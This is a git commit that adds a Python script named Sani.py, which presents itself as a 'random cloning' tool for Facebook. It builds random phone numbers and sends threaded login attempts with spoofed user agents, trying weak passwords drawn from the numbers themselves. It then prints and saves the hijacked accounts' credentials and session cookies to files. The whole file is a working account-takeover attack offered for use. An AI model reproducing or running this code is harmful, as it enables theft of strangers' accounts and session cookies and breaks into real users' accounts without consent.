fd4c0ed0c7611c08a608eb3efd766adaf7be05c4
New1nahid <136487594+New1nahid@users.noreply.github.com>
2023-06-18 17:34:37 +0600

    Create Sani.py
    apt update 
    apt upgrade 
    git clone https://github.com/New1nahid/Sani.git

---
+++ Sani.py
@@ -0,0 +1,263 @@
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    
+#####APK#####
+            
+            
+ 
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.009)
+            
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+xr = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([m,k,xr,u,b])
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+os.system("espeak \"Wall come To Nahid king,Random Tools\"")
+os.system('xdg-open https://www.facebook.com/profile.php?id=100072937785385&mibextid=ZbWKwL/')
+logo =("""\033[1;37m
+
+                                                                                         
+                                                                                 dddddddd
+NNNNNNNN        NNNNNNNN                 hhhhhhh               iiii              d::::::d
+N:::::::N       N::::::N                 h:::::h              i::::i             d::::::d
+N::::::::N      N::::::N                 h:::::h               iiii              d::::::d
+N:::::::::N     N::::::N                 h:::::h                                 d:::::d 
+N::::::::::N    N::::::N  aaaaaaaaaaaaa   h::::h hhhhh       iiiiiii     ddddddddd:::::d 
+N:::::::::::N   N::::::N  a::::::::::::a  h::::hh:::::hhh    i:::::i   dd::::::::::::::d 
+N:::::::N::::N  N::::::N  aaaaaaaaa:::::a h::::::::::::::hh   i::::i  d::::::::::::::::d 
+N::::::N N::::N N::::::N           a::::a h:::::::hhh::::::h  i::::i d:::::::ddddd:::::d 
+N::::::N  N::::N:::::::N    aaaaaaa:::::a h::::::h   h::::::h i::::i d::::::d    d:::::d 
+N::::::N   N:::::::::::N  aa::::::::::::a h:::::h     h:::::h i::::i d:::::d     d:::::d 
+N::::::N    N::::::::::N a::::aaaa::::::a h:::::h     h:::::h i::::i d:::::d     d:::::d 
+N::::::N     N:::::::::Na::::a    a:::::a h:::::h     h:::::h i::::i d:::::d     d:::::d 
+N::::::N      N::::::::Na::::a    a:::::a h:::::h     h:::::hi::::::id::::::ddddd::::::dd
+N::::::N       N:::::::Na:::::aaaa::::::a h:::::h     h:::::hi::::::i d:::::::::::::::::d
+N::::::N        N::::::N a::::::::::aa:::ah:::::h     h:::::hi::::::i  d:::::::::ddd::::d
+NNNNNNNN         NNNNNNN  aaaaaaaaaa  aaaahhhhhhh     hhhhhhhiiiiiiii   ddddddddd   ddddd
+                                                                                         
+                                                                                         
+                                                                                         
+                                                                                         
+                                                                                         
+                                                                                         
+                                                                                         
+   
+                                           
+              AJ KEW NAI BOLE 💔       
+--------------------------------------------
+[✓] FACEBOOK  > NAHID AHMED SANI
+[✓] GITHUB    > NEW 1 NAHID
+[✓] VERSION   > 0.1
+[✓] TOOLS   > RANDOM/GAME ID
+--------------------------------------------""")
+loop = 0
+oks = []
+cps = []
+ 
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
+try:
+    print('\n\n\033[1;37mLoading asset files ...\033[1;37m')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\n\033[1;37mNo internet connection ... \033[1;37m')
+#global functions
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+ 
+#User agents
+ugen2=[]
+ugen=[]
+ 
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+    
+# APK CHECK
+def xxr():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
+    print(" ══════════════════════════════════════════")
+    rk1 = '0171'
+    rk2 = '0172'
+    rk3 = '0175'
+    rk4 = '017'
+    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
+    os.system('clear')
+    print(logo)
+    limit = int(input(f'\033[1;37m[{xr}^{x}]\033[1;37m EXAMPLE : \033[1;37m10000, \x1b[38;5;208m20000, \033[1;37m50000 ] \n\033[1;37m═════════════════════════════════════════ \n\033[1;37m[{xr}^{x}] \033[1;37mPUT CLONING LIMIT:\033[1;37m '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    print(logo)
+    passx = 0
+    HamiiID = []
+    print("")
+    for bilal in range(passx):
+        pww = input(f"[*] Enter Password {bilal+1} : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        jalan('\033[1;37m====================================================')
+        jalan(f'[{xr}^{x}]\033[1;37m YOUR TOTAL IDS: {xr}'+tl)
+        jalan(f'{x}[{xr}^{x}]\033[1;37m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        jalan(f'\033[1;37m[{xr}^{x}]\033[1;37m USE YOUR MOBILE DATA ')
+        jalan(f'\033[1;37m[{xr}^{x}] \033[1;37mUse Flight Mode For Speed Up')
+        jalan(f'\033[1;37m[{xr}^{x}] \033[1;37mSuper Fast Speed Cloning')
+        jalan('\033[1;37m====================================================')
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+                pwx.append(love)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print(f"\n{x} ══════════════════════════════════════════")
+def rcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://web.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'web.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'referer': 'https://www.google.com/',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+            lo = session.post('https://web.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\r\033[1;32m[NAHID-OK💛] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌸]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                os.system('espeak -a 300 " GHOST OK,"')
+                cek_apk(session,coki)
+                open('/sdcard/NAHID-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                #print('\r\r\33[1;30m[GHOST-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
+                open('/sdcard/NAHID-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\r%s{x}[{xr}GHOST{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+ 
+xxr()
+ 
